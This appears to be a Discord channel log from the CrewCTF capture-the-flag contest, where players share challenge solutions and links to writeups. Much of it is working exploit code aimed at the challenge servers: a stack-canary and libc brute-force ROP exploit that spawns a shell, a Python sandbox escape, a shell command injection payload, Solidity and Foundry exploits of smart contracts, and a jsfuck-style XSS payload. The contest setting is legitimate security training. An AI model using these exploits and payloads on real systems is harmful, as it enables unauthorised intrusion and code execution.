w1n_gl0ry
w1n_gl0ry
Online



Text Channel
CrewCTF 2023:writeups
Search

writeups chat
154 new messages since 7:52 AM on July 9, 2023
Mark As Read
April 18, 2022

@Xion
isolationz (feat. <@487852971690819585>): chunk split causes metadata oob write into next chunk, brute until it's 0b111 and then free overwritten chunk to get a large free chunk

K4Fr — 04/18/2022 6:58 PM
Nice, well done to you both. This was my solver for Isolationz:
[6:58 PM]
from pwn import *

sla = lambda a, b, io: io.sendlineafter(a, b)

def add(size, expr):
    sla(">> ", "1", io)
Expand
Isolationz_Solver.py
3 KB

m0z — 04/18/2022 8:11 PM
anyone know what %0d%0a works for Cuuas but %0a%0d doesn't? (edited)
[8:11 PM]
I find it weird because I ran it locally and both payloads work
[8:12 PM]
but on the live instance, the second one doesn't work

@m0z
anyone know what %0d%0a works for Cuuas but %0a%0d doesn't? (edited)

Downtime — 04/18/2022 10:34 PM
because %0d%0a stand of \r\n and this is crlf; Any line in the http request must be and with \r\n
April 19, 2022

@Downtime
because %0d%0a stand of \r\n and this is crlf; Any line in the http request must be and with \r\n

m0z — 04/19/2022 12:26 AM
%0a%0d is also crlf though? (edited)
[12:26 AM]
Both payloads worked fine on my local instance. It only seems to act differently on the ctf instance so I'm wondering is that specific to php config, apache, or something like that?

@Eragon
Another Foro Romano solve (using gaussian elimination): (edited)

LinuxBro — 04/19/2022 9:01 AM
We did the math and realized it was within reason to brute force if we spent like $20 on an AWS instance.  Ended up not doing it though.
[9:01 AM]
It could have put us in top 10 though, so maybe we should have

CSN3RD — 04/19/2022 9:11 AM
how long did you calculate your brute force to take

@LinuxBro
We did the math and realized it was within reason to brute force if we spent like $20 on an AWS instance. Ended up not doing it though.

CSN3RD — 04/19/2022 9:22 AM
"within reason" lol

LinuxBro — 04/19/2022 9:37 AM
like.. 6ish hours?
[9:37 AM]
8 characters of all ascii is like 200 billion attempts (edited)
[9:38 AM]
A quick test on my CPU of a not optimized python script did 100,000 guesses in about 1 second. (edited)
[9:40 AM]
So if we had 128 cores on an AWS machine, with some optimization we could have done ~40 billion an hour (edited)

sahuang — 04/19/2022 9:41 AM
95^8 is way more than 200 billion

CSN3RD — 04/19/2022 9:43 AM
maybe LinuxBro could minimize the character set but i think it would still be more than that
[9:45 AM]
52 (alphabet) + 10 (numbers) + 2 (special symbols in the flag) = 64
64^8 = 2.81474977e14

which is 1,400 times more than 200 billion (edited)

LinuxBro — 04/19/2022 12:22 PM
Hmm, I'm not sure where I messed up my math, but in my defense I didn't get much sleep during the CTF, lol

LinuxBro — 04/19/2022 12:31 PM
Oh, I did only upper and lowercase letters

1

LinuxBro — 04/19/2022 1:00 PM
Glad we didn't pay Amazon :kekw:
[1:00 PM]
I can't use kekw :(

CSN3RD — 04/19/2022 1:01 PM
yah, i made the challenge such that the password itself is not bruteforceable (64^8) and the binary was not bruteforcable (2^56). I kept the password short so that its not too frustrating for someone who starts off coding up a bruteforce solution and then makes optimazations until their program runs in a reasonable time frame. (edited)

LinuxBro — 04/19/2022 1:02 PM
I need to go read a writeup

CSN3RD — 04/19/2022 1:03 PM
not an official writeup, but i did explain a bit about the challenge. ⁠writeups⁠

LinuxBro — 04/19/2022 1:03 PM
It was an interesting challenge.  Once I realized what it was doing I knew there had to be ways to optimize a brute force, just ended up working on other stuff
[1:05 PM]
Who made the two python ACE challenges?
[1:05 PM]
Those were awesome.  I was super bummed I couldn't solve the second one.  I knew what I needed to do, I just couldn't find all the pieces

CSN3RD — 04/19/2022 1:06 PM
i believe Blupper#4774 made them, and a few other team members helped along the way with improving them and testing

LinuxBro — 04/19/2022 1:07 PM
I called a non-cyber programmer friend of to pick his brain and he was hooked in like 5 minutes.
[1:07 PM]
I got a text from his girlfriend 4 hours later saying I had "stolen" her boyfriend.

CSN3RD — 04/19/2022 1:09 PM
that's great to hear. congrats to you all for finishing in 14th place!

LinuxBro — 04/19/2022 1:10 PM
Thanks!  We were 7th at one point near the end of the first 24 hours, a bit bummed we slipped out of top 10, but now we have a goal to stay in the top 10 for our next ctf.

1

CSN3RD — 04/19/2022 1:16 PM
Yah, it would be amazing if we could get even more prizes next time, like top 15 or 20. We were in the talks with companies like Github, CrowdStrike, TryHackMe, HackTheBox, and a few more, but not every company is willing to sponsor a first-time event. They did show interest in sponsoring future events if this one went well so we'll see.

FantasqueX — 04/19/2022 4:10 PM
writeup for Lambang? I can only find a exploit script

@CSN3RD
Yah, it would be amazing if we could get even more prizes next time, like top 15 or 20. We were in the talks with companies like Github, CrowdStrike, TryHackMe, HackTheBox, and a few more, but not every company is willing to sponsor a first-time event. They did show interest in sponsoring future events if this one went well so we'll see.

GhostCcamm — 04/19/2022 4:21 PM
This was one of my favourite CTFs in quite a while. I am sure you can get more sponsors next time.

4

@LinuxBro
Those were awesome. I was super bummed I couldn't solve the second one. I knew what I needed to do, I just couldn't find all the pieces

Blupper — 04/19/2022 11:17 PM
Glad you enjoyed them!

@FantasqueX
writeup for Lambang? I can only find a exploit script

Piers — 04/19/2022 11:21 PM
https://github.com/Piers-0x1/ctf-writeup/blob/main/crew_ctf/Lambang.md
GitHub
ctf-writeup/Lambang.md at main · Piers-0x1/ctf-writeup
Contribute to Piers-0x1/ctf-writeup development by creating an account on GitHub.


4
[11:22 PM]
I tried to write one

FantasqueX — 04/19/2022 11:32 PM
Thx bro!
April 20, 2022

Downtime — 04/20/2022 3:49 AM
French writups
[3:49 AM]
https://cyberseclwahch.wordpress.com/2022/04/18/crewc-tf-2022/
CSHunter
lwahch
Crewc.tf: 2022
Forensic Corrupted Après avoir télécharger le fichier, j’ai trouvé que c’est du « data », pourtant c’est une image de disque corrompu normalement. Alors, j&r…


2
April 21, 2022

@CSN3RD
We will drop the challenge sources soon. Not sure about official writeups but there are solution scripts.

ashiri — 04/21/2022 11:43 AM
Any ETA on dropping challenge sources ?

@ashiri
Any ETA on dropping challenge sources ?

Moriarty — 04/21/2022 12:11 PM
authors are currently busy with everything else but hoping soonish? no ETA yet
April 22, 2022

CROWNPRINCE — 04/22/2022 1:17 AM
https://youtu.be/vclpbFXUPSo
YouTube
Yuvraj Badgoti
CrewCTF 2022

July 9, 2023
NEW

uvicorn — Yesterday at 7:52 AM
Will there be prizes for writeups?

CSN3RD — Yesterday at 8:01 AM
No cash prizes for writeups but we may have some swag / other prizes.

Legoclones — Yesterday at 4:17 PM
Write-up for survey?? 

@Legoclones
Write-up for survey?? 

Moriarty — Yesterday at 4:17 PM


2

AlienX — Yesterday at 7:49 PM

EdogawaSai — Yesterday at 9:12 PM
Can't wait for helpmee writeup

BioGenisis — Yesterday at 10:24 PM
Hey all! I need help understanding how does one practice the crypto challenges? How does one prepare for the maths?

AlienX — Yesterday at 11:11 PM
Lmao math 

Giuseppe — Yesterday at 11:32 PM
anyone made writeup repo?

Jl — Yesterday at 11:53 PM
when ctf end?

@Jl
when ctf end?

Moriarty — Yesterday at 11:53 PM
7 min

gs — Yesterday at 11:56 PM


@Moriarty
7 min

Jl — Yesterday at 11:57 PM
cool
July 10, 2023

@Jl
cool

Pranav — Today at 12:00 AM
solve dumpster sar 

ACHUX21 — Today at 12:00 AM
solve web

2

Pranav — Today at 12:00 AM
@Winters for web 

Titto — Today at 12:01 AM
Me waiting for le web3 writeup

@Pranav
solve dumpster sar 

Jl — Today at 12:01 AM
Pwn solves where ?

@Titto
Me waiting for le web3 writeup

ACHUX21 — Today at 12:01 AM
same

@Jl
Pwn solves where ?

Pranav — Today at 12:01 AM


@Pranav
@Winters for web 

Winters — Today at 12:01 AM
tourpran fan club

2

_सभ्य_ — Today at 12:01 AM

TCP — Today at 12:01 AM
Writeup for misc meeeee?

souf6x — Today at 12:02 AM
Helpmeeeee solution pls

@Titto
Me waiting for le web3 writeup

Kaiziron — Today at 12:02 AM
web3 solution :

deception :
# cast send 0xd92edc2A2cec7387d1bA68853f56B181e58f25Ee "solve(string)" "xyzabc" -r http://146.148.125.86:60082/e317e7f0-6a27-4869-9cc9-e740bc6a1419 --private-key 0x7f425a14aa09dcc2d183ee3c6602dbe03eb919d1df05b8df26d82aea7888a44c


positive :
# cast send 0x11E4Db698FB2d8716637aa50A85ad26d08873fD1 "stayPositive(int64)(int64)" -r http://146.148.125.86:60083/fc6148ac-6ff8-478e-a66d-044db7d94ae9 --private-key 0x9c8836a4f94ecb9dc207709e496371557fa44bd7a31f64bb8d11148bcf1ff65f -- -9223372036854775808


infinite :
pragma solidity ^0.8.0;

import "./Setup.sol";

contract infiniteExploit {
    Setup public setupContract;
    crewToken public CREW;
    respectToken public RESPECT;
    candyToken public CANDY;
    fancyStore public STORE;
    localGang public GANG;
    
    function exploit(address setupAddr) public {
        setupContract = Setup(setupAddr);
        CREW = setupContract.CREW();
        RESPECT = setupContract.RESPECT();
        CANDY = setupContract.CANDY();
        STORE = setupContract.STORE();
        GANG = setupContract.GANG();
        
        CREW.mint();
        CREW.approve(address(STORE), 1);
        STORE.verification();
        CANDY.approve(address(GANG), type(uint256).max);
        RESPECT.approve(address(STORE), type(uint256).max);
        
        for(uint256 i; i < 5; ++i){
            GANG.gainRespect(10);
            STORE.buyCandies(10);
        }
    }
}

1

deebato — Today at 12:02 AM
Writeup for crypto nec?

yuuna — Today at 12:02 AM
Quirky
$ tshark -r chall.pcap -Y 'frame.number gt 4 && tcp.payload' -Tfields -e tcp.payload | xargs -n2 | awk '{print substr($2,1,2)$1}' | paste -sd '' | cut -c113- | xxd -r -p > flag.jpg

or
from pyshark import FileCapture
from binascii import unhexlify

packets = FileCapture(
    'chall.pcap',
    include_raw=True,
    use_json=True
)

data = []
for enum, p in enumerate(packets):
    if enum > 4:
        # Retrieve any packets with data/tcp.payload field
        if hasattr(p, 'data'):
            data.append(p.data.data_raw[0])
        elif hasattr(p.tcp, 'payload'):
            data.append(p.tcp.payload_raw[0])

# Split Retransmission & Dup-ACK packets
ret = data[::2]
dup = data[1::2]

# For each of tcp.stream, prepend 1 bytes from Dup to Ret data
flag = [x[:2] + y for x,y in zip(dup, ret)]

with open('flag.jpg', 'wb') as f:
    flag = ''.join(flag)[112:]
    f.write(unhexlify(flag))

4

gs — Today at 12:02 AM
attaaaack 8, 9 writeup?
[12:02 AM]
ohphp too pls

Pranav — Today at 12:03 AM
company (edited)
from pwn import *

# Set up pwntools for the correct architecture
exe = "./company"
libc = ELF("libc.so.6")
context.binary = elf = ELF(exe)
Expand
exp.py
5 KB

Giuseppe
anyone made writeup repo?

Giuseppe — Today at 12:03 AM
sorry i thought was finished

@Kaiziron
web3 solution : deception : # cast send 0xd92edc2A2cec7387d1bA68853f56B181e58f25Ee "solve(string)" "xyzabc" -r http://146.148.125.86:60082/e317e7f0-6a27-4869-9cc9-e740bc6a1419 --private-key 0x7f425a14aa09dcc2d183ee3c6602dbe03eb919d1df05b8df26d82aea7888a44c positive : # cast send 0x11E4Db698FB2d8716637aa50A85ad26d08873fD1 "stayPositive(int64)(int64)" -r http://146.148.125.86:60083/fc6148ac-6ff8-478e-a66d-044db7d94ae9 --private-key 0x9c8836a4f94ecb9dc207709e496371557fa44bd7a31f64bb8d11148bcf1ff65f -- -9223372036854775808 infinite : pragma solidity ^0.8.0;  import "./Setup.sol";  contract infiniteExploit {     Setup public setupContract;     crewToken public CREW;     respectToken public RESPECT;     candyToken public CANDY;     fancyStore public STORE;     localGang public GANG;          function exploit(address setupAddr) public {         setupContract = Setup(setupAddr);         CREW = setupContract.CREW();         RESPECT = setupContract.RESPECT();         CANDY = setupContract.CANDY();         STORE = setupContract.STORE();         GANG = setupContract.GANG();                  CREW.mint();         CREW.approve(address(STORE), 1);         STORE.verification();         CANDY.approve(address(GANG), type(uint256).max);         RESPECT.approve(address(STORE), type(uint256).max);                  for(uint256 i; i < 5; ++i){             GANG.gainRespect(10);             STORE.buyCandies(10);         }     } }

Titto — Today at 12:03 AM
Thank you bro, and well played

1

@Kaiziron
web3 solution : deception : # cast send 0xd92edc2A2cec7387d1bA68853f56B181e58f25Ee "solve(string)" "xyzabc" -r http://146.148.125.86:60082/e317e7f0-6a27-4869-9cc9-e740bc6a1419 --private-key 0x7f425a14aa09dcc2d183ee3c6602dbe03eb919d1df05b8df26d82aea7888a44c positive : # cast send 0x11E4Db698FB2d8716637aa50A85ad26d08873fD1 "stayPositive(int64)(int64)" -r http://146.148.125.86:60083/fc6148ac-6ff8-478e-a66d-044db7d94ae9 --private-key 0x9c8836a4f94ecb9dc207709e496371557fa44bd7a31f64bb8d11148bcf1ff65f -- -9223372036854775808 infinite : pragma solidity ^0.8.0;  import "./Setup.sol";  contract infiniteExploit {     Setup public setupContract;     crewToken public CREW;     respectToken public RESPECT;     candyToken public CANDY;     fancyStore public STORE;     localGang public GANG;          function exploit(address setupAddr) public {         setupContract = Setup(setupAddr);         CREW = setupContract.CREW();         RESPECT = setupContract.RESPECT();         CANDY = setupContract.CANDY();         STORE = setupContract.STORE();         GANG = setupContract.GANG();                  CREW.mint();         CREW.approve(address(STORE), 1);         STORE.verification();         CANDY.approve(address(GANG), type(uint256).max);         RESPECT.approve(address(STORE), type(uint256).max);                  for(uint256 i; i < 5; ++i){             GANG.gainRespect(10);             STORE.buyCandies(10);         }     } }

KLM — Today at 12:03 AM
damnnnnnnnnn

@Kaiziron
web3 solution : deception : # cast send 0xd92edc2A2cec7387d1bA68853f56B181e58f25Ee "solve(string)" "xyzabc" -r http://146.148.125.86:60082/e317e7f0-6a27-4869-9cc9-e740bc6a1419 --private-key 0x7f425a14aa09dcc2d183ee3c6602dbe03eb919d1df05b8df26d82aea7888a44c positive : # cast send 0x11E4Db698FB2d8716637aa50A85ad26d08873fD1 "stayPositive(int64)(int64)" -r http://146.148.125.86:60083/fc6148ac-6ff8-478e-a66d-044db7d94ae9 --private-key 0x9c8836a4f94ecb9dc207709e496371557fa44bd7a31f64bb8d11148bcf1ff65f -- -9223372036854775808 infinite : pragma solidity ^0.8.0;  import "./Setup.sol";  contract infiniteExploit {     Setup public setupContract;     crewToken public CREW;     respectToken public RESPECT;     candyToken public CANDY;     fancyStore public STORE;     localGang public GANG;          function exploit(address setupAddr) public {         setupContract = Setup(setupAddr);         CREW = setupContract.CREW();         RESPECT = setupContract.RESPECT();         CANDY = setupContract.CANDY();         STORE = setupContract.STORE();         GANG = setupContract.GANG();                  CREW.mint();         CREW.approve(address(STORE), 1);         STORE.verification();         CANDY.approve(address(GANG), type(uint256).max);         RESPECT.approve(address(STORE), type(uint256).max);                  for(uint256 i; i < 5; ++i){             GANG.gainRespect(10);             STORE.buyCandies(10);         }     } }

TheSavageTeddy — Today at 12:03 AM
for deception was given code diff to deployed? did u need to dump bytecode or something to get the actual secret?

0xwarriorh — Today at 12:03 AM
[12:03 AM]
i have Sanity writeup (edited)

KLM — Today at 12:04 AM
so last one was on sending multiple tx in the same block ?
[12:04 AM]
https://0xklm.notion.site/Crew-CTF-GCC-384bf283616a4d4baa8f7c033e592603?pvs=4
Solutions for positive and deception
K.L.M Route on Notion
Crew CTF (GCC)
Positive

@TheSavageTeddy
for deception was given code diff to deployed? did u need to dump bytecode or something to get the actual secret?

Kaiziron — Today at 12:04 AM
just eth_call with from set to the owner (setup), read bytecode also work (edited)

otaku — Today at 12:04 AM
ohPHP was nasty, a loot of cracking. Thanks for this challenge 

@TheSavageTeddy
for deception was given code diff to deployed? did u need to dump bytecode or something to get the actual secret?

Kaiziron — Today at 12:04 AM
# cast call 0xd92edc2A2cec7387d1bA68853f56B181e58f25Ee "password()(string)" -r http://146.148.125.86:60082/e317e7f0-6a27-4869-9cc9-e740bc6a1419 --from 0x3bb575846325074A559b1EFBAfEB5F623C30e811
xyzabc

Ev11ccaatt — Today at 12:05 AM
any all attacks wp
?

TheSavageTeddy — Today at 12:05 AM
oh? u can call deception contract from setup?

gh0stkn1ght — Today at 12:06 AM
any writeups for dumpster??

@TheSavageTeddy
oh? u can call deception contract from setup?

Kaiziron — Today at 12:06 AM
no, its eth_call like simulate the call without making a transaction, and simulate as setup (owner) calling it
[12:06 AM]
dumping runtime bytecode works as well

MagicFrank — Today at 12:06 AM
matrixrsa2?
[12:06 AM]
someone leaked N?

@Kaiziron
no, its eth_call like simulate the call without making a transaction, and simulate as setup (owner) calling it

TheSavageTeddy — Today at 12:07 AM
ohh
[12:07 AM]
u need the owner address for that?
[12:07 AM]
i think i dumped for the owner address

@TheSavageTeddy
u need the owner address for that?

KLM — Today at 12:07 AM
yep

Moriarty — Today at 12:07 AM
⁠official-writeups⁠ dumpster intended solve!!

@TheSavageTeddy
i think i dumped for the owner address

KLM — Today at 12:07 AM
you can use cast storage $target 0

TheSavageTeddy — Today at 12:08 AM
damn i should use cast instead of web3py all the time xd

KLM — Today at 12:08 AM
foundry is damn strong ngl

@TheSavageTeddy
u need the owner address for that?

Kaiziron — Today at 12:08 AM
its just the setup, as setup deployed that contract

KibeththeWalker — Today at 12:08 AM
That intended solution for dumpster is way more complex than what I did lol. I ran strings on the file "memory" and the flag was visible with 3 small formatting changes that needed to be made to it. (edited)

@Kaiziron
its just the setup, as setup deployed that contract

TheSavageTeddy — Today at 12:08 AM
oh bruh yeah im dumb 

@KibeththeWalker
That intended solution for dumpster is way more complex than what I did lol. I ran strings on the file "memory" and the flag was visible with 3 small formatting changes that needed to be made to it. (edited)

Moriarty — Today at 12:09 AM
yeah accidently left flag in memory , didnt even came up in 2 checks!! intended is hard and fun. hope yall learn from that

1

@Moriarty
yeah accidently left flag in memory , didnt even came up in 2 checks!! intended is hard and fun. hope yall learn from that

KibeththeWalker — Today at 12:10 AM
Always interesting those small things that can slip through. Intended solution looks really neat.

Drahoxx — Today at 12:11 AM
For Starship-1 :
TL;DR :
Use @ to exec
\r to new line
\t for space
--> https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#rce-with-decorators
from pwn import remote

r = remote("starship-1.chal.crewc.tf",40003)

print(r.recv())
r.recv()
print(r.recv())
# Send command to exec(input())
r.sendline("@__build_class__.__self__.eval\r@__build_class__.__self__.input\rclass\tX:pass")
# send input()
r.sendline("__build_class__.__self__.print(__build_class__.__self__.open('/flag.txt').read())")
r.recv()
print(r.recv())
 (edited)

gs — Today at 12:13 AM
how the heck do you get to the OhPHP solution in ⁠official-writeups 

Lu513n — Today at 12:14 AM
Solution for Fighter Jet
Used two Logistic Regression models and overfitted the rwr model to get 100% accuracy
from pwn import remote
from sklearn.linear_model import LogisticRegression
from sklearn.preprocessing import PolynomialFeatures
import numpy as np

con = remote('fighterjet.chal.crewc.tf', 40001)
con.recvuntil(b'DATA\n')

radar_x=[]
radar_y=[]
rwr_x=[]
rwr_y=[]

r=con.recvline().decode()
while r !='DUMPING PRIOR RWR DATA\n':
    dat = r.split(',')
    tmp = list(map(float,dat[:-1]))
    if tmp not in radar_x:
        radar_x.append(tmp)
        radar_y.append(dat[-1][:-1])
    r=con.recvline().decode()
r=con.recvline().decode()
while 'SPIKE' not in r:
    dat = r.split(',')
    tmp = list(map(float,dat[:-1]))
    if tmp not in rwr_x:
        rwr_x.append(tmp)
        rwr_y.append(dat[-1][:-1])
    r=con.recvline().decode()

r=r[:-1]

radar_x,radar_y,rwr_x,rwr_y = np.array(radar_x),np.array(radar_y),np.array(rwr_x),np.array(rwr_y)

poly = PolynomialFeatures(degree=3)
rwr_x=poly.fit_transform(rwr_x)

# train model
print("Training model")
radar_model = LogisticRegression().fit(radar_x, radar_y)
rwr_model = LogisticRegression(C=1e6,max_iter=1000000).fit(rwr_x, rwr_y)

print(con.recvuntil(b':').decode().strip('\n'))
d=r.split()[-1].split(',')

print("Predicting")
while 1:
    print(r)
    if len(d)==3:
        temp = list(map(float,d))
        temp = poly.fit_transform(np.array([temp]))
        pred = rwr_model.predict(temp)
        print(pred[0])
    else:
        pred = radar_model.predict([list(map(float,d))])
        print(pred[0])

    if pred[0] == 'GROUND RADAR LOCK' or pred[0] == 'BANDIT':
        con.sendline(b'N')
    else:
        con.sendline(b'Y')
    a=con.recvuntil(b':').decode().split('\n')
    r=a[-2]
    if 'SPIKE' in r:
        d=r.split()[-1].split(',')
    else:
        d=r.split(',')
        
    # r=con.recvline().decode().strip('\n')


con.interactive()
 (edited)

5

zAbuQasem — Today at 12:14 AM
Sequence gallery
--expression=!cat${IFS}fla?.txt${IFS}%23

4

1

@gs
how the heck do you get to the OhPHP solution in ⁠official-writeups 

Lu513n — Today at 12:15 AM
You can reverse the php using this script
import subprocess

def ev(php):
    php=php.replace("abs''","abs(0)")
    out = subprocess.getoutput(f'php -r "echo {php};"')
    if "Parse error" in out:
        print("=======",php,"=======")
        return php,False
    return out,True

fuck = open('chall.php').read()
stack=[]
s=''

def orig(i):
    global fuck
    string=False
    s='('
    while i<len(fuck):
        if fuck[i]=="'" and string:
            string=False
            s+=fuck[i]
        elif fuck[i]=="'":
            string=True
            s+=fuck[i]
        elif fuck[i]=='(' and not string:
            k,j=orig(i+1)
            s+=k
            print(s)
            i=j
        elif fuck[i]==')' and not string:
            s+=')'
            s,check=ev(s)
            if check and s not in ['strstr','abs','array']:
                s=f"'{s}'"
            return s,i
        else:
            s+=fuck[i]
        i+=1
    return s,i

print(orig(0))

You will get somewhat readable output

gs — Today at 12:16 AM
thank you

@Lu513n
Solution for Fighter Jet Used two Logistic Regression models and overfitted the rwr model to get 100% accuracy from pwn import remote from sklearn.linear_model import LogisticRegression from sklearn.preprocessing import PolynomialFeatures import numpy as np  con = remote('fighterjet.chal.crewc.tf', 40001) con.recvuntil(b'DATA\n')  radar_x=[] radar_y=[] rwr_x=[] rwr_y=[]  r=con.recvline().decode() while r !='DUMPING PRIOR RWR DATA\n':     dat = r.split(',')     tmp = list(map(float,dat[:-1]))     if tmp not in radar_x:         radar_x.append(tmp)         radar_y.append(dat[-1][:-1])     r=con.recvline().decode() r=con.recvline().decode() while 'SPIKE' not in r:     dat = r.split(',')     tmp = list(map(float,dat[:-1]))     if tmp not in rwr_x:         rwr_x.append(tmp)         rwr_y.append(dat[-1][:-1])     r=con.recvline().decode()  r=r[:-1]  radar_x,radar_y,rwr_x,rwr_y = np.array(radar_x),np.array(radar_y),np.array(rwr_x),np.array(rwr_y)  poly = PolynomialFeatures(degree=3) rwr_x=poly.fit_transform(rwr_x)  # train model print("Training model") radar_model = LogisticRegression().fit(radar_x, radar_y) rwr_model = LogisticRegression(C=1e6,max_iter=1000000).fit(rwr_x, rwr_y)  print(con.recvuntil(b':').decode().strip('\n')) d=r.split()[-1].split(',')  print("Predicting") while 1:     print(r)     if len(d)==3:         temp = list(map(float,d))         temp = poly.fit_transform(np.array([temp]))         pred = rwr_model.predict(temp)         print(pred[0])     else:         pred = radar_model.predict([list(map(float,d))])         print(pred[0])      if pred[0] == 'GROUND RADAR LOCK' or pred[0] == 'BANDIT':         con.sendline(b'N')     else:         con.sendline(b'Y')     a=con.recvuntil(b':').decode().split('\n')     r=a[-2]     if 'SPIKE' in r:         d=r.split()[-1].split(',')     else:         d=r.split(',')              # r=con.recvline().decode().strip('\n')   con.interactive() (edited)

LinuxBro — Today at 12:17 AM
Nice!  My official writeup has code to plot the RWR data if you're curious what it looks like.

@LinuxBro
Nice! My official writeup has code to plot the RWR data if you're curious what it looks like.

43H1 — Today at 12:18 AM
when are the official writeups coming up?

@43H1
when are the official writeups coming up?

LinuxBro — Today at 12:18 AM
https://discordapp.com/channels/959047109015904306/1127643056666067084

anvbis — Today at 12:18 AM
Typer (part 1):
let _buf = new ArrayBuffer(8);
let _flt = new Float64Array(_buf);
let _int = new BigUint64Array(_buf);

const ftoi = x => {
  _flt[0] = x;
Expand
exp.js
4 KB
[12:18 AM]
Typer (part 2):
console.log(read('flag_i_hope_its_not_broken.txt'))

daffainfo — Today at 12:19 AM
https://github.com/daffainfo/ctf-writeup/tree/main/CrewCTF%202023
Category    Challenge
Forensic    Attaaaaack1
Forensic    Attaaaaack2
Forensic    Attaaaaack3
Forensic    Attaaaaack4
Forensic    Attaaaaack5
Forensic    Attaaaaack6
Forensic    Attaaaaack8
Forensic    Encrypt10n
Forensic    Encrypt10n (2)
GitHub
ctf-writeup/CrewCTF 2023 at main · daffainfo/ctf-writeup
CTF Writeups. Contribute to daffainfo/ctf-writeup development by creating an account on GitHub.


5

1

HARASISCO — Today at 12:27 AM
Rev writeups

@HARASISCO
Rev writeups

Moriarty — Today at 12:28 AM
⁠official-writeups for ez_rev and pv_pro , you will need to wait a while or see other people's solve

HARASISCO — Today at 12:29 AM
Ok thanks

0xbla — Today at 12:30 AM
anyone did OhPHP with z3? it just didn't sat for me

AKS#8701 — Today at 12:33 AM
btw for frsa, the inbuilt Fraction class in python was sufficient to recover the primes.

@Moriarty
⁠official-writeups for ez_rev and pv_pro , you will need to wait a while or see other people's solve

HARASISCO — Today at 12:34 AM
Bro what is this 
This is my first time RE php Idk that's so hard

@HARASISCO
Bro what is this  This is my first time RE php Idk that's so hard

Moriarty — Today at 12:34 AM
haha well i hope you learn from it :D

zenitsu7 — Today at 12:45 AM
can anyone share the write up for quirky

@zenitsu7
can anyone share the write up for quirky

yuuna — Today at 12:45 AM
⁠writeups⁠

zenitsu7 — Today at 12:46 AM
with explanation yuuna i dont need script i am a beginner

Shunt — Today at 12:48 AM
pwn/Warmup
from pwn import *

context.encoding = "latin"
context.log_level = "CRITICAL"
context.terminal = ["tmux", "splitw", "-h"]
context.binary = elf = ELF("./warmup")
libc = elf.libc

gdbscript = """
c
"""

p = remote("34.76.152.107", 17012)
# p = elf.process()
# p = gdb.debug(elf.file.name, gdbscript=gdbscript, aslr=False, setuid=False)


def brute_libc(payload):
    guess = b"\x76"

    for i in range(6):
        for can in range(0, 0x100):
            print(f"\r\rTrying: {can}", end='')
            r = remote(HOST, PORT)
            r.send(payload + guess + pack(can, 'all'))
            data = r.recvrepeat(timeout=10)
            if b"This is helper for you" in data:
                print(f"\n[+] Libc guess: {hex(unpack(guess, 'all'))}")
                r.close()
                guess += pack(can ,'all')
                break
            r.close()

    return unpack(guess, 'all')


def brute_canary(payload):
    guess = b""

    for i in range(8):
        for can in range(0, 0x100):
            print(f"\r\rTrying: {can}", end='')
            r = remote(HOST, PORT)
            r.send(payload + guess + pack(can, 'all'))
            data = r.recvrepeat(timeout=10)
            if b"*** stack smashing detected ***" not in data:
                print(f"\n[+] Canary guess: {hex(unpack(guess, 'all'))}")
                r.close()
                guess += pack(can ,'all')
                break
            r.close()

    return unpack(guess, 'all')


p.recvuntil(b"This challenge will run at port ")
PORT = int(p.recvline().strip())
# PORT = 8008
HOST = "34.76.152.107"

offset = 56
payload = b"A" * offset
canary = brute_canary(payload)
print(f"[+] Canary: {hex(canary)}")

payload += p64(canary) + p64(0xbaddad)
libc.address = brute_libc(payload) - 0x23a76
print(f"[+] Libc: {hex(libc.address)}")

rop = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = pop_rdi + 1

payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(ret)
payload += p64(libc.sym['system'])

r = remote(HOST, PORT)
r.send(payload)
[12:53 AM]
pwn/Company (edited)
#!/usr/bin/env python
from pwn import *

context.arch = "amd64"
context.encoding = "latin"
context.log_level = "DEBUG"
Expand
hack.py
5 KB

6E 61 74 68 — Today at 1:07 AM
Here are my write-ups for the OSINT challenges:
"helpmeeeee"
https://hackmd.io/@6E617468/HkO3ZddKn (edited)
HackMD
Write Up helpmeeeee - HackMD
We first start by looking for this famous Azuradonia Sylyxion:


siunam — Today at 1:09 AM
CrewCTF 2023 writeup
https://siunam321.github.io/ctf/CrewCTF-2023/
Forensics:
Attaaaaack 1 - 13
Encrypt10n
DUMPster (Unsolved)
Web:
sequence_gallery
Misc:
findme
 (edited)
Siunam’s Website
CrewCTF 2023 Writeup
Welcome to my website! In here, you will find things about Capture The Flag (CTF) writeups, blogs and more!


5

sh4dy — Today at 1:57 AM
My writeups for all the web3 challenges
https://sh4dy.com/posts/crewCTF-web3-Writeups/
alias sh4dy = Rakshit
Crewctf Web3 Writeups
Challenge 1 : Positive

2

ChattyPlatinumCool — Today at 2:00 AM
hex2dec
It's really nice how minimalistic this challenge looks, with such an innocent looking regex. Quite quickly you realise that you can use any ASCII character from 48 to 102 and a space, plus-sign and minus-sign. That may seem like a lot, but if you think that you've almost solved it: this is just the start.
We can insert (onerror is not blocked by the CSP):
<IMG SRC=INVALID ONERROR=HOWTOCALLFUNCTIONWITHOUTLOWERCASE>

But how do we write javascript without most of the lowercase letters?

Many CTF players will know about jsfuck, which seems useful here, but we can't use ()!. But maybe we can do something similar? We can use this as a good starting point:
https://stackoverflow.com/questions/63673610/alternative-way-to-get-c-letter-in-jsfuck
The top answer describes in great detail how you can write arbitrary javascript given the limited charset +![]. Luckily way are way less restricted, so we can take some shortcuts that compensate for the lack of ()!. The following was inspired by that top answer and a process of trial and error: A lot of this is redundant or not required, but this is what I wrote:
A=`a`;B=`b`;C=`c`;D=`d`;E=`e`;F=`f`;
INF=+`1e10001`;INFSTR=INF+[];
I=INFSTR[3];N=INFSTR[1];T=INFSTR[6];Y=INFSTR[7];
FALSE=1==0;FALSE=FALSE+[];L=FALSE[2];S=FALSE[3];
TRUE=1==1;TRUE=TRUE+[];R=TRUE[1];U=TRUE[2];
FLAT=[][F+L+A+T];FLAT=FLAT+[];O=FLAT[6];V=FLAT[27];
EMPTYSTRING=[]+[];
STRING=EMPTYSTRING[C+O+N+S+T+R+U+C+T+O+R];
STRINGSTR=STRING+[];G=STRINGSTR[14];
NUMBER=0[C+O+N+S+T+R+U+C+T+O+R];NUMBER=NUMBER+[];M=NUMBER[11];
G=STRING[N+A+M+E][5];
H=101[T+O+`S`+T+R+I+N+G]`21`[1];
K=20[T+O+`S`+T+R+I+N+G]`21`;
P=211[T+O+`S`+T+R+I+N+G]`31`[1];
